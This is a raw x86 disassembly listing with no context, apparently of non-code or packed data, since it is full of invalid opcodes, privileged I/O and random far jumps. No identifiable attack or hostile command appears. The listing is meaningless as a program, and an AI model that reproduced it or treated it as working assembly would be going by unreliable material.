  4130d5:	rcl    BYTE PTR [eax-0x7a6c2055],cl
  4130db:	inc    ebp
  4130dc:	dec    edi
  4130dd:	adc    al,0x38
  4130df:	(bad)  
  4130e0:	sub    edx,edx
  4130e2:	inc    eax
  4130e3:	xor    esi,edi
  4130e5:	int3   
  4130e6:	mov    ah,0xeb
  4130e8:	fs std 
  4130ea:	test   DWORD PTR [edx+ebx*4+0x5d],ebx
  4130ee:	jno    0x413154
  4130f0:	sbb    al,0xc3
  4130f2:	in     al,0x49
  4130f4:	add    DWORD PTR [eax+0x1d],ebx
  4130f7:	(bad)
  4130fa:	mov    ebp,0xb6f74904
  4130ff:	add    al,0x96
  413101:	adc    DWORD PTR [ebx-0x44ead415],ebx
  413107:	or     eax,0xdce0c3fd
  41310c:	mov    WORD PTR [ebp+ebp*2+0x3dc980ad],es
  413113:	in     al,dx
  413114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413115:	mov    cs,WORD PTR [edi+0x6c374387]
  41311b:	data16 lock mov ax,0x3749
  413121:	mov    gs:0x1736079e,al
  413127:	jge    0x41315c
  413129:	pop    ecx
  41312a:	mov    bl,0xac
  41312c:	ror    DWORD PTR [esi-0x5e6e8ee7],0xac
  413133:	jecxz  0x4130da
  413135:	nop
  413136:	call   0x62c3691c
  41313b:	aam    0x7e
  41313d:	daa    
  41313e:	hlt    
  41313f:	data16 mov ds:0xbccb54dd,al
  413145:	call   0x594d6754
  41314a:	xchg   ecx,eax
  41314b:	dec    eax
  41314c:	mov    dh,0x52
  41314e:	call   0x379d:0x5c7ebee4
  413155:	test   al,0x3
  413157:	clc    
  413158:	daa    
  413159:	rcl    BYTE PTR [ecx+0x5a],cl
  41315c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41315d:	push   ebp
  41315e:	dec    edi
  41315f:	js     0x4131ae
  413161:	fisub  DWORD PTR [eax]
  413163:	adc    bh,BYTE PTR [ecx]
  413165:	ret    0xc0f4
  413168:	mov    ecx,0x6f3694f8
  41316d:	mov    eax,0x1de2f5aa
  413172:	and    al,0xd7
  413174:	inc    edi
  413175:	fsubr  QWORD PTR [eax+ebp*8]
  413178:	out    dx,al
  413179:	lea    ebx,[ecx-0x4c]
  41317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41317d:	lock adc al,0x32
  413180:	mov    ds:0x65bf0200,al
  413185:	out    dx,al
  413186:	adc    edi,DWORD PTR [ebp+0x5e]
  413189:	sbb    BYTE PTR [edi+0x77b34807],al
  41318f:	test   DWORD PTR [ecx+0x7c],edi
  413192:	inc    ebp
  413193:	jno    0x41313f
  413195:	or     dl,BYTE PTR [eax+edx*1]
  413198:	mov    bh,0x65
  41319a:	mov    dh,0x15
  41319c:	mov    eax,ds:0x389ad360
  4131a1:	std    
  4131a2:	sti    
  4131a3:	adc    BYTE PTR [edx],al
  4131a5:	(bad)  
  4131a7:	xchg   edi,eax
  4131a8:	xor    dh,dl
  4131aa:	cmp    DWORD PTR [esi],edi
  4131ac:	outs   dx,BYTE PTR ds:[esi]
  4131ad:	mov    esi,0x17f1440c
  4131b2:	leave  
  4131b3:	pop    ds
  4131b4:	jbe    0x4131e1
  4131b6:	sub    BYTE PTR [ecx],cl
  4131b8:	jns    0x41321d
  4131ba:	test   eax,0x61fea124
  4131bf:	aas    
  4131c0:	inc    esp
  4131c1:	add    ch,BYTE PTR [esi]
  4131c3:	mov    esi,0xdfa66442
  4131c8:	pop    ss
  4131c9:	sti    
  4131ca:	sub    al,BYTE PTR [ecx-0x3661c264]
  4131d0:	fstp   DWORD PTR ds:0x5a600cd4
  4131d6:	xor    DWORD PTR [esi-0x14],0x63508eec
  4131dd:	bound  eax,QWORD PTR [esi+0x78065f91]
  4131e3:	mov    bl,0x7f
  4131e5:	add    ebx,ebx
  4131e7:	ret    0xd725
  4131ea:	pushf  
  4131eb:	das    
  4131ec:	imul   ebp,DWORD PTR [eax+0x62],0x6b177e04
  4131f3:	and    eax,0x6cde07e8
  4131f8:	inc    ebx
  4131f9:	pop    es
  4131fa:	push   esp
  4131fb:	fidivr WORD PTR [eax+0x46faf3eb]
  413201:	out    dx,eax
  413202:	sub    eax,0xb6bc8aaa
  413207:	sbb    BYTE PTR [eax-0x65],dh
  41320a:	mov    bl,ch
  41320c:	outs   dx,BYTE PTR ds:[esi]
  41320d:	shr    dl,1
  41320f:	je     0x413192
  413211:	xchg   DWORD PTR [edx+0x56],edx
  413214:	fidiv  DWORD PTR [esi]
  413216:	sub    ebp,ebp
  413218:	mov    eax,0xfe770ef7
  41321d:	dec    eax
  41321e:	or     DWORD PTR [esi+0x33],0x3e79a12c
  413225:	outs   dx,DWORD PTR ds:[esi]
  413226:	mov    ds:0x202730d3,eax
  41322b:	popa   
  41322c:	repnz enter 0x595b,0x12
  413231:	jns    0x4131cb
  413233:	pushf  
  413234:	push   esp
  413235:	adc    eax,0x4bf53c35
  41323a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41323b:	mov    bh,0x70
  41323d:	vaddpd ymm5,ymm0,YMMWORD PTR [eax+0x4115bc79]
  413245:	and    BYTE PTR [ecx+0x2e],0xde
  413249:	dec    eax
  41324a:	dec    ebx
  41324b:	ss jp  0x413250
  41324e:	xchg   ebx,eax
  41324f:	inc    esi
  413250:	sbb    al,0xa2
  413252:	push   ss
  413253:	adc    al,0xcf
  413255:	adc    dl,bh
  413257:	mov    cl,0xfc
  413259:	std    
  41325a:	fs adc eax,0xeec469cd
  413260:	dec    esp
  413261:	and    DWORD PTR [edx+ebp*1-0x53545d7],edi
  413268:	and    esp,DWORD PTR [eax+edi*1+0xc]
  41326c:	imul   eax,DWORD PTR [ebx+ebp*8],0xffffff9e
  413270:	cmc    
  413271:	pop    eax
  413272:	pop    edi
  413273:	popf   
  413274:	jmp    0x41324a
  413276:	adc    eax,0x8440fc9b
  41327b:	cmp    al,0xde
  41327d:	data16 repz xor al,0x76
  413281:	pop    ss
  413282:	ja     0x413235
  413284:	adc    eax,0xad18c879
  413289:	sub    eax,0x305346a2
  41328e:	sub    DWORD PTR [eax+edi*4],ebx
  413291:	cmp    BYTE PTR [ebx-0x61],dh
  413294:	sbb    BYTE PTR [edx+0x33],dh
  413297:	dec    ebx
  413298:	adc    eax,0x66f3e02a
  41329d:	stos   BYTE PTR es:[edi],al
  41329e:	fst    QWORD PTR [edi+0x5d7be02e]
  4132a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132a5:	bound  esi,QWORD PTR [edi]
  4132a7:	iret   
  4132a8:	xchg   edx,eax
  4132a9:	add    eax,0x5cca97dd
  4132ae:	jecxz  0x41325a
  4132b0:	into   
  4132b1:	sbb    bh,bl
  4132b3:	ins    DWORD PTR es:[edi],dx
  4132b4:	pop    edx
  4132b5:	inc    ebp
  4132b6:	and    BYTE PTR ds:0xbe75739,bl
  4132bc:	arpl   WORD PTR [edi+eiz*1-0x76],bx
  4132c0:	mov    esp,0x8f03d144
  4132c5:	nop
  4132c6:	aaa    
  4132c7:	out    0xd8,al
  4132c9:	xor    dl,BYTE PTR [ebx]
  4132cb:	rcl    BYTE PTR [ecx+0x24],cl
  4132ce:	into   
  4132cf:	xlat   BYTE PTR ds:[ebx]
  4132d0:	mov    ds:0x88d592ce,eax
  4132d5:	jp     0x4132df
  4132d7:	int3   
  4132d8:	cdq    
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	jns    0x4132d1
  4132dc:	sub    al,0x2d
  4132de:	mov    edi,0x5ac43b3
  4132e3:	add    al,BYTE PTR [edi-0x10af2437]
  4132e9:	push   edx
  4132ea:	or     al,0x78
  4132ec:	iret   
  4132ed:	bound  edx,QWORD PTR [eax+0x40]
  4132f0:	aas    
  4132f1:	pop    eax
  4132f2:	push   edx
  4132f3:	sti    
  4132f4:	mov    bl,0x9f
  4132f6:	dec    esi
  4132f7:	mov    ch,0xde
  4132f9:	inc    edx
  4132fa:	(bad)  
  4132fb:	lock pusha 
  4132fd:	push   ds
  4132fe:	cli    
  4132ff:	sbb    al,0x25
  413301:	sub    DWORD PTR [esp+eiz*4+0x372521ac],0xffffffa7
  413309:	imul   BYTE PTR [ecx]
  41330b:	montmul (bad)
  41330c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330d:	push   es
  41330e:	xchg   ebp,eax
  41330f:	pop    esi
  413310:	jg     0x413357
  413312:	xor    BYTE PTR [eax+0x159f5bcd],bh
  413318:	arpl   WORD PTR ds:0x515dc54f,dx
  41331e:	and    ebp,edx
  413320:	inc    ebp
  413321:	pop    esp
  413322:	mov    ah,0x18
  413324:	pop    edx
  413325:	rol    BYTE PTR [ebp-0xd855d54],cl
  41332b:	ficomp DWORD PTR [ecx-0x615093e6]
  413331:	xchg   edx,eax
  413332:	jno    0x413342
  413334:	shl    ah,0x1c
  413337:	cld    
  413338:	mov    edi,0x14856054
  41333d:	fcom   DWORD PTR [edx+0x3c]
  413340:	dec    ebp
  413341:	mov    eax,0x2f426ee2
  413346:	or     ebx,DWORD PTR [edx]
  413348:	jns    0x4132e7
  41334a:	out    dx,eax
  41334b:	cs push 0xffffffe8
  41334e:	add    BYTE PTR [esi+0x24fd6e81],al
  413354:	jae    0x413375
  413356:	mov    WORD PTR [ebp-0x2dfc5d60],es
  41335c:	mov    ah,0xe1
  41335e:	sbb    esp,DWORD PTR ds:0x4e14a246
  413364:	xchg   ebx,eax
  413365:	stc    
  413366:	retf   0x67f4
  413369:	pop    esi
  41336a:	xchg   ebx,eax
  41336b:	inc    ebx
  41336c:	xor    edi,DWORD PTR [esi+0x64]
  41336f:	fnsave [eax]
  413371:	adc    al,0x3b
  413373:	xor    al,0xf6
  413375:	cwde   
  413376:	test   BYTE PTR [eax+0x35],bh
  413379:	pop    edi
  41337a:	inc    ebp
  41337b:	push   ecx
  41337c:	add    DWORD PTR [eax+edi*2+0x38],0x83d56af1
  413384:	inc    ebx
  413385:	test   eax,0xe1f954c5
  41338a:	out    dx,al
  41338b:	sub    DWORD PTR [edi+ebp*2],0x33
  41338f:	push   ebx
  413390:	dec    eax
  413391:	add    DWORD PTR [ecx],ebp
  413393:	xor    ebx,DWORD PTR [ebp+0x68]
  413396:	mov    gs,WORD PTR [esp+esi*4-0x4c]
  41339a:	in     al,0x5a
  41339c:	pop    edi
  41339d:	fdivrp st(3),st
  41339f:	mov    al,ds:0x4bc9dad4
  4133a4:	sahf   
  4133a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a6:	jb     0x4133f5
  4133a8:	or     eax,0x2cbd5995
  4133ad:	scas   al,BYTE PTR es:[edi]
  4133ae:	aas    
  4133af:	push   eax
  4133b0:	xchg   ebp,eax
  4133b1:	mov    DWORD PTR [ebx+0x5f01f0a2],esp
  4133b7:	out    dx,al
  4133b8:	fs adc al,0x3d
  4133bb:	mov    ch,0xc2
  4133bd:	cmp    ebx,DWORD PTR [edx+0x14]
  4133c0:	push   fs
  4133c2:	mov    edi,0x64f3db10
  4133c7:	outs   dx,BYTE PTR ds:[esi]
  4133c8:	std    
  4133c9:	mov    ds:0x140d7e81,eax
  4133ce:	sub    eax,0xbde30838
  4133d3:	cmp    ah,ch
  4133d5:	add    DWORD PTR [ebx],eax
  4133d7:	push   dx
  4133d9:	aam    0x73
  4133db:	(bad)  
  4133dc:	shr    al,1
  4133de:	mov    bl,0xf5
  4133e0:	xchg   ecx,eax
  4133e1:	ror    bl,0x60
  4133e4:	js     0x413450
  4133e6:	lds    ebp,FWORD PTR [esp+ebp*2-0x18]
  4133ea:	jo     0x413370
  4133ec:	in     al,0x90
  4133ee:	hlt    
  4133ef:	call   0x1f774b46
  4133f4:	test   al,0x3f
  4133f6:	rcl    BYTE PTR [ecx+edx*8+0x29fe5c9c],cl
  4133fd:	std    
  4133fe:	cwde   
  4133ff:	ss call 0x2b3faf3
  413405:	add    ecx,DWORD PTR [edi+0x6b99ef26]
  41340b:	stc    
  41340c:	ja     0x413410
  41340e:	ret    0x7833
  413411:	jnp    0x413400
  413413:	mov    edx,DWORD PTR fs:[ecx-0x71ad08e6]
  41341a:	jnp    0x413471
  41341c:	fdivr  QWORD PTR [eax-0x6c]
  41341f:	in     al,dx
  413420:	xchg   esp,eax
  413421:	les    esi,FWORD PTR [ecx+0x33]
  413424:	leave  
  413425:	xchg   BYTE PTR [esi+0x60fb022e],ah
  41342b:	fst    DWORD PTR [edi+0x5b]
  41342e:	popa   
  41342f:	mov    esp,0x594409c9
  413434:	cmp    eax,0x5412a1a2
  413439:	bound  ebx,QWORD PTR [ecx]
  41343b:	pop    ebx
  41343c:	mul    DWORD PTR [ebx-0x51e6bda9]
  413442:	xor    edx,DWORD PTR [ebp+0x2]
  413445:	icebp  
  413446:	push   edi
  413447:	cs popaw 
  41344a:	lds    ebp,FWORD PTR [edx-0x6e]
  41344d:	sub    DWORD PTR [eax+ebx*4-0x60],esi
  413451:	test   al,0x53
  413453:	jg     0x41343b
  413455:	int3   
  413456:	imul   ecx,DWORD PTR [ebp+0x3b],0x1969288c
  41345d:	or     esp,DWORD PTR [edi+0x33]
  413460:	addr16 sub al,0x18
  413463:	aas    
  413464:	sbb    DWORD PTR [esi-0x1a],edx
  413467:	data16 clc 
  413469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346a:	imul   edx,ecx,0x65
  41346d:	add    esp,ebp
  41346f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413470:	jne    0x41349f
  413472:	jo     0x413407
  413474:	mov    dh,dh
  413476:	scas   eax,DWORD PTR es:[edi]
  413477:	xchg   ebx,eax
  413478:	jo     0x41348d
  41347a:	push   esp
  41347b:	jbe    0x413420
  41347d:	mov    ecx,0xd838e50c
  413482:	popf   
  413483:	fmul   DWORD PTR [ebp-0x55]
  413486:	push   edx
  413487:	(bad)  
  413488:	ror    BYTE PTR [edi-0x6],1
  41348b:	cs jne 0x413432
  41348e:	mov    esi,0xfc04024f
  413493:	nop
  413494:	std    
  413495:	sub    BYTE PTR ds:0x15d8cd70,bl
  41349b:	jmp    0x2099:0xfd376336
  4134a2:	inc    eax
  4134a3:	imul   ebx,eax,0xffffffe9
  4134a6:	inc    ecx
  4134a7:	push   ebx
  4134a8:	sub    al,0xe4
  4134aa:	hlt    
  4134ab:	inc    esp
  4134ac:	(bad)  
  4134ae:	mov    cs,ebx
  4134b0:	retf   
  4134b1:	xor    ebx,DWORD PTR [esi]
  4134b3:	es push ecx
  4134b5:	xchg   esp,eax
  4134b6:	lock adc bl,BYTE PTR [edi+0x7749ceed]
  4134bd:	mov    dl,0x16
  4134bf:	sub    eax,0x6c52eff7
  4134c4:	lea    ecx,[ecx+0x21de4808]
  4134ca:	iret   
  4134cb:	push   ds
  4134cc:	push   ebx
  4134cd:	mov    ebp,0x381f9668
  4134d2:	sbb    BYTE PTR [edx+0x5b],dh
  4134d5:	ds push esp
  4134d7:	or     esp,DWORD PTR [ebx-0x30]
  4134da:	pusha  
  4134db:	adc    BYTE PTR [ebx+0x74],bh
  4134de:	mov    cl,0x74
  4134e0:	in     eax,dx
  4134e1:	(bad)  
  4134e2:	pusha  
  4134e3:	xchg   edi,eax
  4134e4:	rcr    BYTE PTR [eax+0x34],0x14
  4134e8:	xchg   ebp,eax
  4134e9:	dec    edi
  4134ea:	dec    esi
  4134eb:	add    al,0x4d
  4134ed:	add    edx,DWORD PTR [ebp+0x58]
  4134f0:	and    ebx,DWORD PTR [ebx+0x6523b61d]
  4134f6:	cmp    ah,ah
  4134f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f9:	xor    al,0xf0
  4134fb:	mov    al,0x90
  4134fd:	add    ebx,esi
  4134ff:	jmp    0x41351a
  413501:	out    dx,eax
  413502:	addr16 retf 0x9482
  413506:	in     eax,dx
  413507:	xor    ecx,DWORD PTR [ebx]
  413509:	push   ecx
  41350a:	sbb    eax,0x343af95a
  41350f:	jb     0x413510
  413511:	hlt    
  413512:	imul   edi,esi,0xcb7040f7
  413518:	das    
  413519:	or     al,al
  41351b:	jl     0x413585
  41351d:	cmp    eax,0x7291adf8
  413522:	add    bl,dl
  413524:	jae    0x4134b6
  413526:	aam    0x51
  413528:	jmp    0x4134f2
  41352a:	dec    eax
  41352b:	outs   dx,BYTE PTR ds:[esi]
  41352c:	jmp    0x413549
  41352e:	jmp    0xfe0e:0x294e010b
  413535:	mov    esp,DWORD PTR [eax-0x6f]
  413538:	pop    esp
  413539:	lds    eax,FWORD PTR [edx+0x22]
  41353c:	xchg   esi,eax
  41353d:	dec    ebx
  41353e:	xchg   edx,eax
  41353f:	jo     0x413572
  413541:	sbb    DWORD PTR [edx-0x7e4c882],esp
  413547:	add    al,0xea
  413549:	test   al,0x9d
  41354b:	lahf   
  41354c:	lods   al,BYTE PTR ds:[esi]
  41354d:	mov    ecx,0x870655b6
  413552:	pop    esp
  413553:	ds test al,0x84
  413556:	jecxz  0x41359f
  413558:	hlt    
  413559:	xchg   ebp,esi
  41355b:	(bad)
  41355e:	inc    esp
  41355f:	pop    edi
  413560:	stc    
  413561:	inc    ebp
  413562:	arpl   WORD PTR [edx],cx
  413564:	mov    bl,0x60
  413566:	outs   dx,DWORD PTR ds:[esi]
  413567:	jmp    0xe46da1ba
  41356c:	push   ebp
  41356d:	sub    al,0x5
  41356f:	(bad)  
  413570:	xor    al,0x15
  413572:	xchg   ebx,eax
  413573:	and    edi,DWORD PTR [ecx+0xa]
  413576:	xchg   ebp,eax
  413577:	or     eax,0x35e1bee8
  41357c:	cmp    ah,BYTE PTR [ebp-0x589dba21]
  413582:	aad    0x5a
  413584:	aaa    
  413585:	popa   
  413586:	call   0x5640:0xe162aa2
  41358d:	inc    eax
  41358e:	dec    edx
  41358f:	out    dx,eax
  413590:	pop    ebp
  413591:	neg    DWORD PTR [ecx]
  413593:	cmp    eax,0x521d7220
  413598:	(bad)  
  413599:	cmp    al,0x2a
  41359b:	popa   
  41359c:	jmp    0x870c:0xeed2bfd5
  4135a3:	ret    
  4135a4:	leave  
  4135a5:	sub    BYTE PTR [ebp+0x7e164bc4],0x20
  4135ac:	push   eax
  4135ad:	add    bl,bl
  4135af:	stos   BYTE PTR es:[edi],al
  4135b0:	or     eax,0xb88dc787
  4135b5:	cmc    
  4135b6:	(bad)  
  4135b7:	push   esi
  4135b8:	aaa    
  4135b9:	imul   eax,ebx,0x79
  4135bc:	bound  ebx,QWORD PTR [ecx-0x16]
  4135bf:	jl     0x41360d
  4135c1:	or     eax,DWORD PTR [ecx+0x6a]
  4135c4:	xor    cl,BYTE PTR [ebx+0x56f7006f]
  4135ca:	xchg   ebp,eax
  4135cb:	rol    BYTE PTR [edi],cl
  4135cd:	dec    ebp
  4135ce:	push   es
  4135cf:	outs   dx,DWORD PTR ds:[esi]
  4135d0:	ror    ah,cl
  4135d2:	scas   al,BYTE PTR es:[edi]
  4135d3:	xchg   esi,eax
  4135d4:	sbb    ah,BYTE PTR [ecx+0x29]
  4135d7:	out    dx,al
  4135d8:	and    ah,BYTE PTR [edx]
  4135da:	or     edi,DWORD PTR [esi]
  4135dc:	leave  
  4135dd:	in     eax,dx
  4135de:	inc    ebx
  4135df:	xor    ch,BYTE PTR [edi+eax*1-0x92d5762]
  4135e6:	pop    esp
  4135e7:	retf   
  4135e8:	cmp    cl,BYTE PTR [esp+ebx*1-0x75]
  4135ec:	sbb    al,0xb3
  4135ee:	bound  esi,QWORD PTR [eax-0x33]
  4135f1:	inc    BYTE PTR [edx+0x1daa5405]
  4135f7:	shr    DWORD PTR [esi+0x2d],0x9
  4135fb:	enter  0xc823,0x7e
  4135ff:	pop    ebx
  413600:	xchg   ebx,eax
  413601:	dec    eax
  413602:	dec    edi
  413603:	xchg   edi,eax
  413604:	mov    edi,0x187dc4f0
  413609:	sbb    dl,BYTE PTR [eax]
  41360b:	sub    al,0xf7
  41360d:	ror    dh,0x1d
  413610:	push   ss
  413611:	sbb    BYTE PTR [edx],dl
  413613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413614:	shr    DWORD PTR [ebp+0x6c],1
  413617:	add    DWORD PTR [edx],edx
  413619:	pop    eax
  41361a:	mov    ebx,0xa751c197
  41361f:	cmp    esp,edx
  413621:	imul   ebp,DWORD PTR [esi],0xf675cd5
  413627:	sub    cl,al
  413629:	retf   
  41362a:	rcr    DWORD PTR [edi-0x7d509740],0x5
  413631:	jne    0x4135f7
  413633:	sbb    BYTE PTR [esi],bh
  413635:	int3   
  413636:	jl     0x4135d6
  413638:	sbb    DWORD PTR [eax+0x71a0fd6e],0xca6fa84e
  413642:	stc    
  413643:	xchg   edx,eax
  413644:	test   eax,0x21eac72e
  413649:	mov    cl,0xd
  41364b:	inc    edi
  41364c:	xlat   BYTE PTR ds:[ebx]
  41364d:	pop    esi
  41364e:	push   eax
  41364f:	mov    ecx,0xf47bbd6b
  413654:	mov    esi,0x2b5fb67b
  413659:	sbb    eax,ecx
  41365b:	data16 adc BYTE PTR [edi+0x7a709469],ah
  413662:	dec    edx
  413663:	inc    edi
  413664:	addr16 pop edi
  413666:	jmp    0x6255:0xb8810cd8
  41366d:	jbe    0x4135ff
  41366f:	sub    ebx,DWORD PTR ds:0x89106726
  413675:	mov    al,ds:0xe9fad3b9
  41367a:	pushf  
  41367b:	and    al,0xe6
  41367d:	mov    dh,0xb0
  41367f:	jo     0x41365d
  413681:	rcr    BYTE PTR [esi-0x14],0x56
  413685:	fsub   DWORD PTR [esi]
  413687:	sub    ebx,DWORD PTR [ecx+0x3]
  41368a:	call   0x58ea5af6
  41368f:	addr16 je 0x4136f3
  413692:	aaa    
  413693:	or     ebx,DWORD PTR [ebx+0x2584ffcc]
  413699:	mov    eax,0x90fca35a
  41369e:	add    ah,BYTE PTR [ebp+0xafd9bb3]
  4136a4:	icebp  
  4136a5:	inc    edx
  4136a6:	stos   BYTE PTR es:[edi],al
  4136a7:	scas   al,BYTE PTR es:[edi]
  4136a8:	pop    ss
  4136a9:	add    cl,BYTE PTR [edi]
  4136ab:	retf   
  4136ac:	xchg   edi,eax
  4136ad:	and    ebp,DWORD PTR [ecx-0xbab8e2d]
  4136b3:	pop    ds
  4136b4:	push   es
  4136b5:	pop    esi
  4136b6:	sbb    al,0xab
  4136b8:	test   al,0xf1
  4136ba:	add    ah,BYTE PTR ds:0xa1547373
  4136c0:	pop    ecx
  4136c1:	mov    edx,0x67407e66
  4136c6:	sbb    ch,BYTE PTR [eax+esi*8+0x5c3de776]
  4136cd:	jg     0x4136ae
  4136cf:	js     0x413719
  4136d1:	push   ss
  4136d2:	fidivr WORD PTR [edi+0x7a9eb0ce]
  4136d8:	pop    ds
  4136d9:	je     0x413682
  4136db:	iret   
  4136dc:	pop    esp
  4136dd:	ret    
  4136de:	xchg   ebp,eax
  4136df:	jbe    0x4136a8
  4136e1:	dec    edx
  4136e2:	add    ch,ah
  4136e4:	loope  0x413717
  4136e6:	mov    edx,0x9a317757
  4136eb:	in     al,dx
  4136ec:	jge    0x413726
  4136ee:	scas   eax,DWORD PTR es:[edi]
  4136ef:	ror    ch,1
  4136f1:	adc    bl,BYTE PTR [ecx]
  4136f3:	enter  0x149e,0xce
  4136f7:	sub    DWORD PTR [edx],eax
  4136f9:	add    edi,DWORD PTR [edx]
  4136fb:	pop    edi
  4136fc:	out    0x23,eax
  4136fe:	sbb    al,0x25
  413700:	into   
  413701:	out    0xd7,al
  413703:	pop    esp
  413704:	xchg   edi,eax
  413705:	pop    ecx
  413706:	les    esp,FWORD PTR gs:[edx-0x4f]
  41370a:	icebp  
  41370b:	cmp    eax,0x8393004a
  413710:	repz inc eax
  413712:	mov    DWORD PTR [ecx-0x35],esp
  413715:	inc    ebp
  413716:	mov    DWORD PTR ss:[esi],eax
  413719:	and    al,0x5c
  41371b:	cmc    
  41371c:	sub    edi,eax
  41371e:	inc    edx
  41371f:	(bad)  
  413720:	mov    ebp,0x898ffd7d
  413725:	into   
  413726:	(bad)  
  413727:	jno    0x4136bf
  413729:	scas   al,BYTE PTR es:[edi]
  41372a:	fsub   st(3),st
  41372c:	jae    0x413771
  41372e:	pop    ss
  41372f:	inc    ebx
  413730:	mov    DWORD PTR [edi+ecx*4+0x5a7a1272],0xcbddfbb5
  41373b:	jmp    0xf2d6a81c
  413740:	mov    ds:0x16971934,eax
  413745:	in     eax,dx
  413746:	imul   eax,DWORD PTR [edi+0x56],0xe25de32b
  41374d:	(bad)  
  41374e:	push   ebx
  41374f:	test   eax,0x6ccb948f
  413754:	test   al,0x60
  413756:	push   ebx
  413757:	int    0x87
  413759:	pop    edx
  41375a:	fwait
  41375b:	sub    eax,0x56325f74
  413760:	mov    cl,0x5d
  413762:	ss push ss
  413764:	and    DWORD PTR [eax+eax*1-0x5a3b462b],ebp
  41376b:	lock sub eax,0xffa12159
  413771:	mov    al,0xbc
  413773:	jmp    0x350fbdba
  413778:	mov    ebx,0xce1ed1d8
  41377d:	xor    BYTE PTR [esi+0xe059d25],bh
  413783:	sbb    BYTE PTR [ebp-0x69],dh
  413786:	clc    
  413787:	jp     0x413721
  413789:	arpl   cx,sp
  41378b:	inc    ecx
  41378c:	push   ecx
  41378d:	sub    ecx,DWORD PTR [edi+eax*1-0x74]
  413791:	rcl    DWORD PTR [ebp+0x2c3e9b43],cl
  413797:	jb     0x413800
  413799:	mov    ecx,0x45d3c52d
  41379e:	add    eax,0x911a1e57
  4137a3:	mov    bl,0x5b
  4137a5:	lods   al,BYTE PTR ds:[esi]
  4137a6:	xor    al,0x31
  4137a8:	sbb    DWORD PTR [edx],esi
  4137aa:	in     al,0x2b
  4137ac:	outs   dx,BYTE PTR ds:[esi]
  4137ad:	sar    eax,0xc6
  4137b0:	adc    bl,BYTE PTR [edx]
  4137b2:	add    eax,0x877d8bee
  4137b7:	add    ebx,DWORD PTR [edx-0x78b5a7b1]
  4137bd:	sub    BYTE PTR [esi+eiz*4-0x1b4862ed],cl
  4137c4:	adc    eax,DWORD PTR [esi+0xa]
  4137c7:	repnz pop ecx
  4137c9:	mov    dl,0x96
  4137cb:	mov    edi,DWORD PTR [edx+ebx*4+0x17521a82]
  4137d2:	lods   al,BYTE PTR ds:[esi]
  4137d3:	cld    
  4137d4:	push   edx
  4137d5:	retf   
  4137d6:	push   cs
  4137d7:	xor    BYTE PTR [ebx],0x48
  4137da:	mov    BYTE PTR [edi],bh
  4137dc:	loopne 0x41383e
  4137de:	inc    esi
  4137df:	or     eax,0xa94b466f
  4137e4:	add    esi,DWORD PTR [ebx-0x53]
  4137e7:	ins    DWORD PTR es:[edi],dx
  4137e8:	jo     0x41378e
  4137ea:	imul   ecx,esp,0x154b82df
  4137f0:	into   
  4137f1:	xchg   edx,eax
  4137f2:	bound  edx,QWORD PTR [esi-0x368768dd]
  4137f8:	addr16 jl 0x4137b6
  4137fb:	loop   0x413815
  4137fd:	popa   
  4137fe:	fwait
  4137ff:	push   esp
  413800:	jno    0x4137de
  413802:	push   ebp
  413803:	pop    ecx
  413804:	mov    al,ah
  413806:	jbe    0x413844
  413808:	add    al,0xf
  41380a:	cmp    DWORD PTR [esi-0x48b749c],0x2c540ef3
  413814:	adc    ecx,edx
  413816:	mov    eax,ds:0x344cb5be
  41381b:	adc    eax,0xa154ff84
  413820:	mov    cs,WORD PTR [ebp-0x63]
  413823:	and    edi,DWORD PTR [ecx]
  413825:	mov    dh,0x50
  413827:	cs stos DWORD PTR es:[edi],eax
  413829:	aad    0x60
  41382b:	add    al,0x40
  41382d:	pusha  
  41382e:	and    al,0xed
  413830:	hlt    
  413831:	jmp    0x41387a
  413833:	aaa    
  413834:	call   0x3c06:0x80c5b2f1
  41383b:	loopne 0x4137fe
  41383d:	mov    dh,0x4a
  41383f:	pop    esi
  413840:	pop    esi
  413841:	jmp    0x4c40:0xb00fa1ae
  413848:	xchg   ecx,eax
  413849:	out    0x0,eax
  41384b:	sub    al,0x71
  41384d:	ror    DWORD PTR [esi-0x5d3750b4],cl
  413853:	adc    ah,0x2
  413856:	outs   dx,BYTE PTR ds:[esi]
  413857:	ficomp DWORD PTR [ebx]
  413859:	pop    edx
  41385a:	xor    al,0x3e
  41385c:	gs xor al,0xa9
  41385f:	dec    ecx
  413860:	mov    ebx,0x62880e79
  413865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413866:	push   edx
  413867:	in     al,dx
  413868:	cmp    DWORD PTR [esp+edx*2-0x31ba449b],eax
  41386f:	stos   DWORD PTR es:[edi],eax
  413870:	mov    DWORD PTR [ecx+0x2d],ebp
  413873:	add    DWORD PTR [edx+0x7cfa441e],0xffffffee
  41387a:	sar    DWORD PTR [edx],cl
  41387c:	mov    ds:0xfc89539f,al
  413881:	mov    ch,0xc5
  413883:	cmp    DWORD PTR [ecx+edi*2-0x74],esp
  413887:	bound  edi,QWORD PTR [eax]
  413889:	mov    ds:0xfdf284cb,al
  41388e:	stc    
  41388f:	icebp  
  413890:	xlat   BYTE PTR ds:[ebx]
  413891:	repz in eax,0xc4
  413894:	push   ss
  413895:	pusha  
  413896:	xor    eax,0xb41b15c7
  41389b:	push   edx
  41389c:	adc    ebp,DWORD PTR [ebx]
  41389e:	pop    ebp
  41389f:	out    dx,eax
  4138a0:	or     DWORD PTR [ecx],ebx
  4138a2:	loopne 0x4138ed
  4138a4:	(bad)  
  4138a5:	adc    BYTE PTR [eax+0x33b0c06a],dh
  4138ab:	sar    ebx,1
  4138ad:	imul   DWORD PTR [ebx+0x5e0321f8]
  4138b3:	lea    ecx,[eax]
  4138b5:	sub    dh,bh
  4138b7:	sub    DWORD PTR [ebx],eax
  4138b9:	pushf  
  4138ba:	jo     0x413889
  4138bc:	aas    
  4138bd:	inc    edi
